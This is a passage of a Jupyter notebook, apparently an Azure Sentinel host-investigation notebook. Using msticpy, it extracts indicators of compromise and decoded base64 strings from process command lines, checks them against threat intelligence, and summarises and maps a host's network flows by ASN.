  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:31:26.280399Z",
     "start_time": "2020-05-15T23:31:25.106400Z"
    }
   },
   "outputs": [],
   "source": [
    "selected_tgt_logon = selected_logon[\"TargetUserName\"].iat[0]\n",
    "system_logon = (selected_tgt_logon.lower() == \"system\" \n",
    "                or selected_tgt_logon.endswith(\"$\"))\n",
    "if not system_logon:\n",
    "    logonId = selected_logon[\"TargetLogonId\"].iloc[0]\n",
    "    sess_procs = processes_on_host.query(\n",
    "        \"TargetLogonId == @logonId | SubjectLogonId == @logonId\"\n",
    "    )\n",
    "else:\n",
    "    sess_procs = clus_events\n",
    "\n",
    "ioc_extractor = IoCExtract()\n",
    "os_family = host_entity.OSType if host_entity.OSType else \"Windows\"\n",
    "\n",
    "ioc_df = ioc_extractor.extract(\n",
    "    data=sess_procs,\n",
    "    columns=[\"CommandLine\"],\n",
    "    os_family=os_family,\n",
    "    ioc_types=[\"ipv4\", \"ipv6\", \"dns\", \"url\", \"md5_hash\", \"sha1_hash\", \"sha256_hash\"],\n",
    ")\n",
    "if len(ioc_df):\n",
    "    display(Markdown(\"### IoC patterns found in process set.\"))\n",
    "    display(ioc_df[[\"IoCType\", \"Observable\"]].drop_duplicates())\n",
    "else:\n",
    "    display(Markdown(\"### No IoC patterns found in process tree.\"))\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " ## If any Base64 encoded strings, decode and search for IoCs in the results.\n",
    " &lt;details&gt;\n",
    "     <summary> <u>Details...</u></summary>\n",
    " This section looks for base64 encoded strings within the data - this is a common way of hiding attacker intent. It attempts to decode any strings that look like base64. Additionally, if the base64 decode operation returns any items that look like a base64 encoded string or file, a gzipped binary sequence, a zipped or tar archive, it will attempt to extract the contents before searching for potentially interesting IoC observables within the decoded data.\n",
    "\n",
    " For simple strings the Base64 decoded output is straightforward. However for nested encodings this can get a little complex and difficult to represent in a tabular format.\n",
    "\n",
    " **Columns**\n",
    "  - reference - The index of the row item in dotted notation in depth.seq pairs (e.g. 1.2.2.3 would be the 3 item at depth 3 that is a child of the 2nd item found at depth 1). This may not always be an accurate notation - it is mainly use to allow you to associate an individual row with the reference value contained in the full_decoded_string column of the topmost item).\n",
    "  - original_string - the original string before decoding.\n",
    "  - file_name - filename, if any (only if this is an item in zip or tar file).\n",
    "  - file_type - a guess at the file type (this is currently elementary and only includes a few file types).\n",
    "  - input_bytes - the decoded bytes as a Python bytes string.\n",
    "  - decoded_string - the decoded string if it can be decoded as a UTF-8 or UTF-16 string. Note: binary sequences may often successfully decode as UTF-16 strings but, in these cases, the decodings are meaningless.\n",
    "  - encoding_type - encoding type (UTF-8 or UTF-16) if a decoding was possible, otherwise 'binary'.\n",
    "  - file_hashes - collection of file hashes for any decoded item.\n",
    "  - md5 - md5 hash as a separate column.\n",
    "  - sha1 - sha1 hash as a separate column.\n",
    "  - sha256 - sha256 hash as a separate column.\n",
    "  - printable_bytes - printable version of input_bytes as a string of \\xNN values\n",
    "  - src_index - the index of the row in the input dataframe from which the data came.\n",
    "  - full_decoded_string - the full decoded string with any decoded replacements. This is only really useful for top-level items, since nested items will only show the 'full' string representing the child fragment.\n",
    " &lt;/details&gt;"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:31:27.893142Z",
     "start_time": "2020-05-15T23:31:27.880144Z"
    }
   },
   "outputs": [],
   "source": [
    "\n",
    "dec_df = base64.unpack_items(data=sess_procs, column=\"CommandLine\")\n",
    "if dec_df is not None and len(dec_df) > 0:\n",
    "    display(HTML(\"<h3>Decoded base 64 command lines</h3>\"))\n",
    "    display(HTML(\"Decoded values and hashes of decoded values shown below.\"))\n",
    "    display(\n",
    "        HTML(\n",
    "            \"Warning - some binary patterns may be decodable as unicode strings. \"\n",
    "            'In these cases you should ignore the \"decoded_string\" column '\n",
    "            'and treat the encoded item as a binary - using the \"printable_bytes\" '\n",
    "            \"column or treat the decoded_string as a binary (bytes) value.\"\n",
    "        )\n",
    "    )\n",
    "\n",
    "    display(\n",
    "        dec_df[\n",
    "            [\n",
    "                \"full_decoded_string\",\n",
    "                \"decoded_string\",\n",
    "                \"original_string\",\n",
    "                \"printable_bytes\",\n",
    "                \"file_hashes\",\n",
    "            ]\n",
    "        ]\n",
    "    )\n",
    "\n",
    "    ioc_dec_df = ioc_extractor.extract(data=dec_df, columns=[\"full_decoded_string\"])\n",
    "    if len(ioc_dec_df):\n",
    "        display(HTML(\"<h3>IoC patterns found in events with base64 decoded data</h3>\"))\n",
    "        display(ioc_dec_df)\n",
    "        ioc_df = ioc_df.append(ioc_dec_df, ignore_index=True)\n",
    "else:\n",
    "    print(\"No base64 encodings found.\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "  [Contents](#Contents)\n",
    " ## Threat Intel Lookup\n",
    "\n",
    " This section takes the output from the IoC Extraction from commandlines and submits it to Threat Intelligence services to see if any of the IoC are known threats.\n",
    "\n",
    "Please take a moment to review the `Selected` list below and remove any items that are obviously not items that you want to lookup (e.g. `myadmintool.ps` is almost certainly a PowerShell script but is also a valid match for a legal DNS domain).\n",
    "<details>\n",
    "    <summary>TI Configuration</summary>\n",
    "If you have not used msticpy threat intelligence lookups before you will need to supply API keys for the \n",
    "TI Providers that you want to use. Please see the section on configuring [msticpyconfig.yaml](#msticpyconfig.yaml-configuration-File)\n",
    "\n",
    "Then reload provider settings:\n",
    "```\n",
    "mylookup = TILookup()\n",
    "mylookup.reload_provider_settings()\n",
    "```\n",
    "</details>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:31:36.912323Z",
     "start_time": "2020-05-15T23:31:30.600559Z"
    }
   },
   "outputs": [],
   "source": [
    "ti_lookup = TILookup()\n",
    "ti_lookup.provider_status\n",
    "\n",
    "items = list(ioc_df[\"Observable\"].values)\n",
    "ioc_ss = nbwidgets.SelectSubset(\n",
    "    items,\n",
    "    default_selected=items\n",
    ")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:31:47.445775Z",
     "start_time": "2020-05-15T23:31:37.910324Z"
    }
   },
   "outputs": [],
   "source": [
    "iocs_to_check = (ioc_df[ioc_df[\"Observable\"].isin(ioc_ss.selected_items)]\n",
    "                 [[\"IoCType\", \"Observable\"]].drop_duplicates())\n",
    "\n",
    "ti_lookup.lookup_iocs(data=iocs_to_check, obs_col=\"Observable\", ioc_type_col=\"IoCType\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " <a></a>[Contents](#toc)\n",
    " # Network Check Communications with Other Hosts"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:32:07.424166Z",
     "start_time": "2020-05-15T23:32:07.379166Z"
    }
   },
   "outputs": [],
   "source": [
    "ip_q_times = nbwidgets.QueryTime(\n",
    "    label=\"Set time bounds for network queries\",\n",
    "    units=\"day\",\n",
    "    max_before=28,\n",
    "    before=2,\n",
    "    after=5,\n",
    "    max_after=28,\n",
    "    origin_time=proc_query_times.origin_time\n",
    ")\n",
    "ip_q_times.display()\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " ## Query Flows by Host IP Addresses"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:32:15.750114Z",
     "start_time": "2020-05-15T23:32:09.049085Z"
    }
   },
   "outputs": [],
   "source": [
    "if \"AzureNetworkAnalytics_CL\" not in table_index:\n",
    "    md_warn(\"AzureNetworkAnalytics_CL table is not available.\")\n",
    "    md(\"No network flow data available. \"\n",
    "       + \"Please skip the remainder of this section.\",\n",
    "      \"blue, bold\")\n",
    "    az_net_comms_df = None\n",
    "else:\n",
    "    all_host_ips = (\n",
    "        host_entity.private_ips + host_entity.public_ips + [host_entity.IPAddress]\n",
    "    )\n",
    "    host_ips = [i.Address for i in all_host_ips]\n",
    "\n",
    "    az_net_comms_df = qry_prov.Network.list_azure_network_flows_by_ip(\n",
    "        ip_q_times, ip_address_list=host_ips\n",
    "    )\n",
    "\n",
    "    if isinstance(az_net_comms_df, pd.DataFrame) and not az_net_comms_df.empty:\n",
    "        az_net_comms_df['TotalAllowedFlows'] = az_net_comms_df['AllowedOutFlows'] + az_net_comms_df['AllowedInFlows']\n",
    "        nbdisplay.display_timeline(\n",
    "            data=az_net_comms_df,\n",
    "            group_by=\"L7Protocol\",\n",
    "            title=\"Network Flows by Protocol\",\n",
    "            time_column=\"FlowStartTime\",\n",
    "            source_columns=[\"FlowType\", \"AllExtIPs\", \"L7Protocol\", \"FlowDirection\"],\n",
    "            height=300,\n",
    "            legend=\"right\",\n",
    "            yaxis=True\n",
    "        )\n",
    "        nbdisplay.display_timeline(\n",
    "            data=az_net_comms_df,\n",
    "            group_by=\"FlowDirection\",\n",
    "            title=\"Network Flows by Direction\",\n",
    "            time_column=\"FlowStartTime\",\n",
    "            source_columns=[\"FlowType\", \"AllExtIPs\", \"L7Protocol\", \"FlowDirection\"],\n",
    "            height=300,\n",
    "            legend=\"right\",\n",
    "            yaxis=True\n",
    "        )\n",
    "    else:\n",
    "        print(\"No network data for specified time range.\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:32:17.381114Z",
     "start_time": "2020-05-15T23:32:17.067117Z"
    }
   },
   "outputs": [],
   "source": [
    "if az_net_comms_df is not None and not az_net_comms_df.empty:\n",
    "    flow_plot = nbdisplay.display_timeline_values(\n",
    "        data=az_net_comms_df,\n",
    "        group_by=\"L7Protocol\",\n",
    "        source_columns=[\"FlowType\", \n",
    "                        \"AllExtIPs\", \n",
    "                        \"L7Protocol\", \n",
    "                        \"FlowDirection\", \n",
    "                        \"TotalAllowedFlows\"],\n",
    "        time_column=\"FlowStartTime\",\n",
    "        title=\"Network flows by Layer 7 Protocol\",\n",
    "        y=\"TotalAllowedFlows\",\n",
    "        ref_event=related_alert,\n",
    "        legend=\"right\",\n",
    "        height=500,\n",
    "        kind=[\"vbar\", \"circle\"]\n",
    "    );\n",
    "else:\n",
    "    md(\"No network data for specified time range.\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " ## Flow Summary"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:32:18.693115Z",
     "start_time": "2020-05-15T23:32:18.586117Z"
    }
   },
   "outputs": [],
   "source": [
    "if az_net_comms_df is not None and not az_net_comms_df.empty:\n",
    "    cm = sns.light_palette(\"green\", as_cmap=True)\n",
    "\n",
    "    cols = [\n",
    "        \"VMName\",\n",
    "        \"VMIPAddress\",\n",
    "        \"PublicIPs\",\n",
    "        \"SrcIP\",\n",
    "        \"DestIP\",\n",
    "        \"L4Protocol\",\n",
    "        \"L7Protocol\",\n",
    "        \"DestPort\",\n",
    "        \"FlowDirection\",\n",
    "        \"AllExtIPs\",\n",
    "        \"TotalAllowedFlows\",\n",
    "    ]\n",
    "    flow_index = az_net_comms_df[cols].copy()\n",
    "\n",
    "    def get_source_ip(row):\n",
    "        if row.FlowDirection == \"O\":\n",
    "            return row.VMIPAddress if row.VMIPAddress else row.SrcIP\n",
    "        else:\n",
    "            return row.AllExtIPs if row.AllExtIPs else row.DestIP\n",
    "\n",
    "    def get_dest_ip(row):\n",
    "        if row.FlowDirection == \"O\":\n",
    "            return row.AllExtIPs if row.AllExtIPs else row.DestIP\n",
    "        else:\n",
    "            return row.VMIPAddress if row.VMIPAddress else row.SrcIP\n",
    "\n",
    "    flow_index[\"source\"] = flow_index.apply(get_source_ip, axis=1)\n",
    "    flow_index[\"dest\"] = flow_index.apply(get_dest_ip, axis=1)\n",
    "    md(f\"{len(flow_index)} events in flow index\")\n",
    "\n",
    "    # Uncomment to view flow_index results\n",
    "#     with warnings.catch_warnings():\n",
    "#         warnings.simplefilter(\"ignore\")\n",
    "#         display(\n",
    "#             flow_index[\n",
    "#                 [\"source\", \"dest\", \"L7Protocol\", \"FlowDirection\", \"TotalAllowedFlows\"]\n",
    "#             ]\n",
    "#             .groupby([\"source\", \"dest\", \"L7Protocol\", \"FlowDirection\"])\n",
    "#             .sum()\n",
    "#             .reset_index()\n",
    "#             .style.bar(subset=[\"TotalAllowedFlows\"], color=\"#d65f5f\")\n",
    "#         )\n",
    "else:\n",
    "    md(\"No network data for specified time range.\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:33:03.907521Z",
     "start_time": "2020-05-15T23:32:26.377680Z"
    }
   },
   "outputs": [],
   "source": [
    "# WHOIS lookup function\n",
    "from functools import lru_cache\n",
    "from ipwhois import IPWhois\n",
    "from ipaddress import ip_address\n",
    "\n",
    "\n",
    "@lru_cache(maxsize=1024)\n",
    "def get_whois_info(ip_lookup, show_progress=False):\n",
    "    try:\n",
    "        ip = ip_address(ip_lookup)\n",
    "    except ValueError:\n",
    "        return \"Not an IP Address\", {}\n",
    "    if ip.is_private:\n",
    "        return \"private address\", {}\n",
    "    if not ip.is_global:\n",
    "        return \"other address\", {}\n",
    "    whois = IPWhois(ip)\n",
    "    whois_result = whois.lookup_whois()\n",
    "    if show_progress:\n",
    "        print(\".\", end=\"\")\n",
    "    return whois_result[\"asn_description\"], whois_result\n",
    "\n",
    "\n",
    "# Add ASN informatio from Whois\n",
    "flows_df = (\n",
    "    flow_index[[\"source\", \"dest\", \"L7Protocol\", \"FlowDirection\", \"TotalAllowedFlows\"]]\n",
    "    .groupby([\"source\", \"dest\", \"L7Protocol\", \"FlowDirection\"])\n",
    "    .sum()\n",
    "    .reset_index()\n",
    ")\n",
    "\n",
    "num_ips = len(flows_df[\"source\"].unique()) + len(flows_df[\"dest\"].unique())\n",
    "print(f\"Performing WhoIs lookups for {num_ips} IPs \", end=\"\")\n",
    "#flows_df = flows_df.assign(DestASN=\"\", DestASNFull=\"\", SourceASN=\"\", SourceASNFull=\"\")\n",
    "flows_df[\"DestASN\"] = flows_df.apply(lambda x: get_whois_info(x.dest, True), axis=1)\n",
    "flows_df[\"SourceASN\"] = flows_df.apply(lambda x: get_whois_info(x.source, True), axis=1)\n",
    "print(\"done\")\n",
    "\n",
    "# Split the tuple returned by get_whois_info into separate columns\n",
    "flows_df[\"DestASNFull\"] = flows_df.apply(lambda x: x.DestASN[1], axis=1)\n",
    "flows_df[\"DestASN\"] = flows_df.apply(lambda x: x.DestASN[0], axis=1)\n",
    "flows_df[\"SourceASNFull\"] = flows_df.apply(lambda x: x.SourceASN[1], axis=1)\n",
    "flows_df[\"SourceASN\"] = flows_df.apply(lambda x: x.SourceASN[0], axis=1)\n",
    "\n",
    "our_host_asns = [get_whois_info(ip.Address)[0] for ip in host_entity.public_ips]\n",
    "md(f\"Host {host_entity.HostName} ASNs:\", \"bold\")\n",
    "md(str(our_host_asns))\n",
    "\n",
    "flow_sum_df = flows_df.groupby([\"DestASN\", \"SourceASN\"]).agg(\n",
    "    TotalAllowedFlows=pd.NamedAgg(column=\"TotalAllowedFlows\", aggfunc=\"sum\"),\n",
    "    L7Protocols=pd.NamedAgg(column=\"L7Protocol\", aggfunc=lambda x: x.unique().tolist()),\n",
    "    source_ips=pd.NamedAgg(column=\"source\", aggfunc=lambda x: x.unique().tolist()),\n",
    "    dest_ips=pd.NamedAgg(column=\"dest\", aggfunc=lambda x: x.unique().tolist()),\n",
    ").reset_index()\n",
    "flow_sum_df"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Choose ASNs/IPs to Check for Threat Intel Reports\n",
    "Choose from the list of Selected ASNs for the IPs you wish to check on.\n",
    "The Source list is been pre-populated with all ASNs found in the network flow summary.\n",
    "\n",
    "As an example, we've populated the `Selected` list with the ASNs that have the lowest number of flows to and from the host. We also remove the ASN that matches the ASN of the host we are investigating.\n",
    "\n",
    "Please edit this list, using flow summary data above as a guide and leaving only ASNs that you are suspicious about. Typicially these would be ones with relatively low `TotalAllowedFlows` and possibly with unusual `L7Protocols`.\n",
    "<details>\n",
    "    <summary>TI Configuration</summary>\n",
    "If you have not used msticpy threat intelligence lookups before you will need to supply API keys for the \n",
    "TI Providers that you want to use. Please see the section on configuring [msticpyconfig.yaml](#msticpyconfig.yaml-configuration-File)\n",
    "\n",
    "Then reload provider settings:\n",
    "```\n",
    "mylookup = TILookup()\n",
    "mylookup.reload_provider_settings()\n",
    "```\n",
    "</details>"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:33:05.240520Z",
     "start_time": "2020-05-15T23:33:05.179518Z"
    },
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "all_asns = list(flow_sum_df[\"DestASN\"].unique()) + list(flow_sum_df[\"SourceASN\"].unique())\n",
    "all_asns = set(all_asns) - set([\"private address\"])\n",
    "\n",
    "# Select the ASNs in the 25th percentile (lowest number of flows)\n",
    "quant_25pc = flow_sum_df[\"TotalAllowedFlows\"].quantile(q=[0.25]).iat[0]\n",
    "quant_25pc_df = flow_sum_df[flow_sum_df[\"TotalAllowedFlows\"] <= quant_25pc]\n",
    "other_asns = list(quant_25pc_df[\"DestASN\"].unique()) + list(quant_25pc_df[\"SourceASN\"].unique())\n",
    "other_asns = set(other_asns) - set(our_host_asns)\n",
    "md(\"Choose IPs from Selected ASNs to look up for Threat Intel.\", \"bold\")\n",
    "sel_asn = nbwidgets.SelectSubset(source_items=all_asns, default_selected=other_asns)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2020-05-15T23:33:20.587377Z",
     "start_time": "2020-05-15T23:33:06.602518Z"
    },
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "from itertools import chain\n",
    "from msticpy.sectools.tiproviders.ti_provider_base import TISeverity\n",
    "\n",
    "def ti_check_ser_sev(severity, threshold):\n",
    "    threshold = TISeverity.parse(threshold)\n",
    "    return severity.apply(lambda x: TISeverity.parse(x) >= threshold)\n",
    "\n",
    "\n",
    "dest_ips = set(chain.from_iterable(flow_sum_df[flow_sum_df[\"DestASN\"].isin(sel_asn.selected_items)][\"dest_ips\"]))\n",
    "src_ips = set(chain.from_iterable(flow_sum_df[flow_sum_df[\"SourceASN\"].isin(sel_asn.selected_items)][\"source_ips\"]))\n",
    "selected_ips = dest_ips | src_ips\n",
    "md(f\"{len(selected_ips)} unique IPs in selected ASNs\")\n",
    "\n",
    "# Add the IoCType to save cost of inferring each item\n",
    "md(\"Looking up TI...\")\n",
    "selected_ip_dict = {ip: \"ipv4\" for ip in selected_ips}\n",
    "ti_results = ti_lookup.lookup_iocs(data=selected_ip_dict)\n",
    "\n",
    "md(f\"{len(ti_results)} results received.\")\n",
    "\n",
    "ti_results_pos = ti_results[ti_check_ser_sev(ti_results[\"Severity\"], 1)]\n",
    "print(f\"{len(ti_results_pos)} positive results found.\")\n",
    "\n",
    "if not ti_results_pos.empty:\n",
    "    src_pos = flows_df.merge(ti_results_pos, left_on=\"source\", right_on=\"Ioc\")\n",
    "    dest_pos = flows_df.merge(ti_results_pos, left_on=\"dest\", right_on=\"Ioc\")\n",
    "    ti_ip_results = pd.concat([src_pos, dest_pos])\n",
    "    md_warn(\"Positive Threat Intel Results found for the following flows\")\n",
    "    md(\"Please examine these IP flows using the IP Explorer notebook.\", \"bold, large\")\n",
    "    display(ti_ip_results)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " ## GeoIP Map of External IPs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "ExecuteTime": {
     "end_time": "2019-10-19T01:25:26.845038Z",
     "start_time": "2019-10-19T01:25:26.778039Z"
    }
   },
   "outputs": [],
   "source": [
    "def format_ip_entity(row, ip_col):\n",
    "    ip_entity = entities.IpAddress(Address=row[ip_col])\n",
    "    iplocation.lookup_ip(ip_entity=ip_entity)\n",
    "    ip_entity.AdditionalData[\"protocol\"] = row.L7Protocol\n",
    "    if \"severity\" in row:\n",
    "        ip_entity.AdditionalData[\"threat severity\"] = row[\"severity\"]\n",
    "    if \"Details\" in row:\n",
    "        ip_entity.AdditionalData[\"threat details\"] = row[\"Details\"]\n",
    "    return ip_entity\n",
    "\n",
    "# from msticpy.nbtools.foliummap import FoliumMap\n",
    "folium_map = FoliumMap(zoom_start=4)\n",
    "if az_net_comms_df is None or az_net_comms_df.empty:\n",
    "    print(\"No network flow data available.\")\n",
    "else:\n",
    "    # Get the flow records for all flows not in the TI results\n",
    "    selected_out = flows_df[flows_df[\"DestASN\"].isin(sel_asn.selected_items)]\n",
    "    selected_out = selected_out[~selected_out[\"dest\"].isin(ti_ip_results[\"Ioc\"])]\n",
    "    if selected_out.empty:\n",
    "        ips_out = []\n",
    "    else:\n",
    "        ips_out = list(selected_out.apply(lambda x: format_ip_entity(x, \"dest\"), axis=1))\n",
    "    \n",
    "    selected_in = flows_df[flows_df[\"SourceASN\"].isin(sel_asn.selected_items)]\n",
    "    selected_in = selected_in[~selected_in[\"source\"].isin(ti_ip_results[\"Ioc\"])]\n",
    "    if selected_in.empty:\n",
    "        ips_in = []\n",
    "    else:\n",
    "        ips_in = list(selected_in.apply(lambda x: format_ip_entity(x, \"source\"), axis=1))\n",
    "\n",
    "    ips_threats = list(ti_ip_results.apply(lambda x: format_ip_entity(x, \"Ioc\"), axis=1))\n",
    "\n",
    "    display(HTML(\"<h3>External IP Addresses communicating with host</h3>\"))\n",
    "    display(HTML(\"Numbered circles indicate multiple items - click to expand\"))\n",
    "    display(HTML(\"Location markers: <br>Blue = outbound, Purple = inbound, Green = Host, Red = Threats\"))\n",
    "\n",
    "    icon_props = {\"color\": \"green\"}\n",
    "    for ips in host_entity.public_ips:\n",
    "        ips.AdditionalData[\"host\"] = host_entity.HostName\n",
    "    folium_map.add_ip_cluster(ip_entities=host_entity.public_ips, **icon_props)\n",
    "    icon_props = {\"color\": \"blue\"}\n",
    "    folium_map.add_ip_cluster(ip_entities=ips_out, **icon_props)\n",
    "    icon_props = {\"color\": \"purple\"}\n",
    "    folium_map.add_ip_cluster(ip_entities=ips_in, **icon_props)\n",
    "    icon_props = {\"color\": \"red\"}\n",
    "    folium_map.add_ip_cluster(ip_entities=ips_threats, **icon_props)\n",
    "    folium_map.center_map()\n",
    "    display(folium_map)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " <a></a>[Contents](#toc)\n",
    " # Appendices"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " ## Available DataFrames"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "print(\"List of current DataFrames in Notebook\")\n",
    "print(\"-\" * 50)\n",
    "current_vars = list(locals().keys())\n",
    "for var_name in current_vars:\n",
    "    if isinstance(locals()[var_name], pd.DataFrame) and not var_name.startswith(\"_\"):\n",
    "        print(var_name)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    " ## Saving Data to Excel\n",
    " To save the contents of a pandas DataFrame to an Excel spreadsheet\n",
    " use the following syntax\n",
    " ```\n",
    " writer = pd.ExcelWriter('myWorksheet.xlsx')\n",
    " my_data_frame.to_excel(writer,'Sheet1')\n",
    " writer.save()\n",
    " ```"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Configuration\n",
    "\n",
    "### `msticpyconfig.yaml` configuration File\n",
    "You can configure primary and secondary TI providers and any required parameters in the `msticpyconfig.yaml` file. This is read from the current directory or you can set an environment variable (`MSTICPYCONFIG`) pointing to its location.\n",
    "\n",
    "To configure this file see the [ConfigureNotebookEnvironment notebook](https://github.com/Azure/Azure-Sentinel-Notebooks/blob/master/ConfiguringNotebookEnvironment.ipynb)"
   ]
  }
 ],
 "metadata": {
  "file_extension": ".py",
  "hide_input": false,
  "kernelspec": {
   "display_name": "Python (condadev)",
   "language": "python",
   "name": "condadev"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.7"
  },
  "latex_envs": {
   "LaTeX_envs_menu_present": true,
   "autoclose": false,
   "autocomplete": true,
   "bibliofile": "biblio.bib",
   "cite_by": "apalike",
   "current_citInitial": 1,
   "eqLabelWithNumbers": true,
   "eqNumInitial": 1,
   "hotkeys": {
    "equation": "Ctrl-E",
    "itemize": "Ctrl-I"
   },
   "labels_anchors": false,
   "latex_user_defs": false,
   "report_style_numbering": false,
   "user_envs_cfg": false
  },
  "mimetype": "text/x-python",
  "name": "python",
  "npconvert_exporter": "python",
  "pygments_lexer": "ipython3",
  "toc": {
   "base_numbering": 1,
   "nav_menu": {},
   "number_sections": true,
   "sideBar": true,
   "skip_h1_title": false,
   "title_cell": "Contents",
   "title_sidebar": "Contents",
   "toc_cell": true,
   "toc_position": {
    "height": "calc(100% - 180px)",
    "left": "10px",
    "top": "150px",
    "width": "323.667px"
   },
   "toc_section_display": true,
   "toc_window_display": true
  },
  "varInspector": {
   "cols": {
    "lenName": 16,
    "lenType": 16,
    "lenVar": 40
   },
   "kernels_config": {
    "python": {
     "delete_cmd_postfix": "",
     "delete_cmd_prefix": "del ",
     "library": "var_list.py",
     "varRefreshCmd": "print(var_dic_list())"
    },
    "r": {
     "delete_cmd_postfix": ") ",
     "delete_cmd_prefix": "rm(",
     "library": "var_list.r",
     "varRefreshCmd": "cat(var_dic_list()) "
    }
   },
   "position": {
    "height": "649.85px",
    "left": "1596px",
    "right": "20px",
    "top": "120px",
    "width": "350px"
   },
   "types_to_exclude": [
    "module",
    "function",
    "builtin_function_or_method",
    "instance",
    "_Feature"
   ],
   "window_display": false
  },
  "version": 3,
  "widgets": {
   "application/vnd.jupyter.widget-state+json": {
    "state": {
     "0095173532d340dfaa5d2a07ab6cbdaa": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "00c22d420eb14ddcb896345c45e8cae6": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonModel",
      "state": {
       "description": "⇽ Remove",
       "layout": "IPY_MODEL_4d534e9db5b1465fb66bd32932549174",
       "style": "IPY_MODEL_bb0184404977459fa59995f17211cc71"
      }
     },
     "01072e2a14c54b2f8681bd8e7563030c": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "0122ae93d43c4e4b93b087de541f2990": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query end time (UTC) :  ",
       "layout": "IPY_MODEL_fc1c25c052124d69a862037672bf3391",
       "style": "IPY_MODEL_2600745c32c94f7d9589c66abb058bf1",
       "value": "2019-02-15 11:52:06"
      }
     },
     "028317534f634339bbdb8a7f0d49b37c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "031540bc4553409ba12c9fcd44a1d5a3": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "IntRangeSliderModel",
      "state": {
       "_model_name": "IntRangeSliderModel",
       "_view_name": "IntRangeSliderView",
       "description": "Time Range (day):",
       "layout": "IPY_MODEL_f41e95ac21954b58a3568b8734bfa3f9",
       "max": 20,
       "min": -20,
       "style": "IPY_MODEL_69dac1d5821a4bd2adb96c40a74bf06c",
       "value": [
        -5,
        1
       ]
      }
     },
     "03ffb5657f8d47a2809b6c77845ea134": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query start time (UTC):",
       "layout": "IPY_MODEL_2cc7d9fbfee446b2b53a416965d544ab",
       "style": "IPY_MODEL_fb23d971449a4c12838b713304ecd568",
       "value": "2019-02-07 12:32:50.220000"
      }
     },
     "046874da90664fa48459ae8bd3afbfcb": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "058befd71b5448408ab5800bad67fb51": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "07a5f823146d4732930c9b6a61cc1605": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "height": "200px",
       "width": "100%"
      }
     },
     "07e3806808ec48b6bbcba99638d9d824": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_90880e712e554e70bbe29c070477e42a",
        "IPY_MODEL_3787982f853c4bec8aed0f195c8df89b",
        "IPY_MODEL_bb5f07f4251b4ad2b36b2198def0ce3c"
       ],
       "layout": "IPY_MODEL_c1a07bf17c42455d9c0666f71486e40e"
      }
     },
